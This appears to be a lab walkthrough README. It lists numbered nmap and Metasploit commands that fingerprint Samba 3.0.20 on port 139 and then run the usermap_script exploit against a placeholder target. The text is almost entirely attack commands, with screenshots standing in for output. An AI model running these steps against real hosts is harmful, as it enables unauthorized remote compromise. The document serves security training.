# Port-139-netbios-ssn-Samba-smbd-3.X---4.X-workgroup-WORKGROUP-
1.nmap -sV (target ip)

2.msfconsole

3.msf 6 > search smb

![image](https://github.com/thanawut2903/Port-139-netbios-ssn-Samba-smbd-3.X---4.X-workgroup-WORKGROUP-/assets/159118913/79c6ea7a-ea95-4168-9358-6f0ca9b97695)
4.msf 6 > use auiliary/scanner/smb/smb_version

5.msf 6 > set RHOST (target ip)
![image](https://github.com/thanawut2903/Port-139-netbios-ssn-Samba-smbd-3.X---4.X-workgroup-WORKGROUP-/assets/159118913/95f78644-5107-4447-908b-13660f86b603)
6.msf 6 > run
![image](https://github.com/thanawut2903/Port-139-netbios-ssn-Samba-smbd-3.X---4.X-workgroup-WORKGROUP-/assets/159118913/80560e75-ed9d-4bd2-8bd4-877537ad5191)
7.searchsploit Samba | grep 3.0.20
![image](https://github.com/thanawut2903/Port-139-netbios-ssn-Samba-smbd-3.X---4.X-workgroup-WORKGROUP-/assets/159118913/b21e9a6d-adc4-4443-8fde-3d83725c9198)
8.msf 6 > use exploit/multi/samba/usermap_script
![image](https://github.com/thanawut2903/Port-139-netbios-ssn-Samba-smbd-3.X---4.X-workgroup-WORKGROUP-/assets/159118913/b82b5022-5880-4bf1-a75d-621ca16760dd)
9.msf 6 > set RHOST (target ip)
10.msf 6 > exploit
![image](https://github.com/thanawut2903/Port-139-netbios-ssn-Samba-smbd-3.X---4.X-workgroup-WORKGROUP-/assets/159118913/8fcb8276-efda-4b13-b718-3927c305f34a)
